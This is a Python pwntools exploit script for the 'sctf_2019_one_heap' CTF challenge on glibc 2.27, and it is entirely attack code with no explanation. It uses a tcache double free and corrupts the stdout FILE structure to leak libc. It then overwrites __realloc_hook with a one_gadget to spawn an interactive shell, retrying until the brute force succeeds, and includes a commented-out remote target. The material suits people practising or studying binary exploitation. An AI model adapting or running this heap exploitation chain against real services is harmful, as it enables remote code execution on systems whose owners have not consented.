from pwn import *

#context.log_level = 'debug'

libc = ELF('libc-2.27.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'choice:', b'1')
    sla(b'size:', str(size).encode())
    sa(b'content:', content)

def delete():
    sla(b'choice:', b'2')

def exp():
    alloc(0x70, b'\n')
    delete()
    delete()

    alloc(0x70, b'\x10\xc0\n')
    alloc(0x70, b'\n')
    alloc(0x70, b'\x00' * 0x23 + b'\x07\n')
    delete()
    #p.recv()
    #pause()
    if 'invalid' in p.recvline().decode():
        raise Exception("")
    alloc(0x40, b'\x00' * 0x28 + b'\n')
    alloc(0x10, p64(0) + b'\x60\x67\n')
    delete()
    
    alloc(0x40, p64(0xfbad1887) + p64(0) * 3 + b'\x58\n')
    
    leak_addr = u64(p.recvuntil(b'\x7f', timeout=0.5)[-6:].ljust(8, b'\x00'))
    if leak_addr == 0:
        raise Exception("")
    success('leak_addr -> {}'.format(hex(leak_addr)))
    libc_base = leak_addr - libc.sym['_IO_file_jumps']
    success('libc_base -> {}'.format(hex(libc_base)))
    
    realloc_hook = libc_base + libc.sym['__realloc_hook']
    realloc = libc_base + libc.sym['__libc_realloc']

    one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]
    one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]
    one = one_gadgets[2] + libc_base


    alloc(0x10, p64(realloc_hook) + b'\n')
    alloc(0x30, p64(one) + p64(realloc + 0x4) + b'\n')
    alloc(0x1, b'a')
    p.interactive()
    

if __name__ == "__main__":
    times = 0
    while True:
        times += 1
        print('{} started'.format(times))
        try:
            p = process('./sctf_2019_one_heap')
            #p = remote('node4.buuoj.cn', 28296)
            exp()
            break
        except:
            p.close()